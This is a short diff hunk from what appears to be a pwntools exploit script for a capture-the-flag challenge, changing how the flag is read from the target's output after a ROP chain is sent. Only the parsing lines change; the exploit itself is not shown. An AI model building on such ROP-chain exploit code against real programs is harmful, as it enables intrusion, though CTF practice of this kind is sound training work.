@@ -45,5 +45,5 @@ rop += bl_print_file
 p.sendline(rop)
 log.success(f"ROPchain = {rop}")
 
-flag = p.recvall(timeout=1).split(b'\n')[-3]
+flag = p.recvall().split(b'\n')[-2]
 log.success(f"FLAG : {flag}")
